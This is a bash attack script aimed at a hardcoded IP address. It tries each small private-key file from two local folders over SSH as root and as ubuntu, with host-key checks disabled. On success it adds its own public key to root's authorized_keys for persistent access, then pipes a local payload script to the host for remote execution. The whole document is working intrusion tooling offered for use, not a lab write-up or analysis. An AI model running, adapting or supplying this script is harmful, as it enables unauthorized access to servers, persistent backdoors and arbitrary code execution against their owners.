#!/bin/bash
set +e
H=123.184.7.135
echo "### LOCAL2 $(date -u +%FT%TZ) egress=$(curl -s -m 10 https://api.ipify.org)"
ls -l keys2 2>/dev/null | head -20
N=0
for k in keys2/* keys/* 2>/dev/null; do
  [ -f "$k" ] || continue
  sz=$(stat -c%s "$k"); [ "$sz" -gt 6000 ] && continue
  chmod 600 "$k"
  for u in root ubuntu; do
    r=$(timeout 18 ssh -i "$k" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=6 -o IdentitiesOnly=yes $u@$H 'echo KEYOK; id -un' 2>&1 | tr '\n' ' ')
    N=$((N+1))
    case "$r" in *KEYOK*) echo "HIT-KEY $k user=$u :: $r"; echo "$k|$u" > /tmp/hit; break 2;; esac
    echo "try $k $u sz=$sz :: $(echo "$r" | sed 's/Warning: Permanently added.*//' | cut -c1-90)"
  done
done
echo "attempts=$N"
if [ -f /tmp/hit ]; then
  K=$(cut -d'|' -f1 /tmp/hit); U=$(cut -d'|' -f2 /tmp/hit)
  ssh-keygen -y -f "$K" > /tmp/p.pub 2>/dev/null
  ssh -i "$K" -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o IdentitiesOnly=yes $u@$H "mkdir -p /root/.ssh; grep -qF '$(cut -d' ' -f2 /tmp/p.pub)' /root/.ssh/authorized_keys 2>/dev/null || cat >> /root/.ssh/authorized_keys" < /tmp/p.pub
  ssh -i "$K" -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o IdentitiesOnly=yes $U@$H 'bash -s' < vantage/i5495_payload.sh 2>&1 | tee /tmp/pay.log
else
  echo "NO-ENTRY-2"
fi
echo "### LOCAL2-DONE"
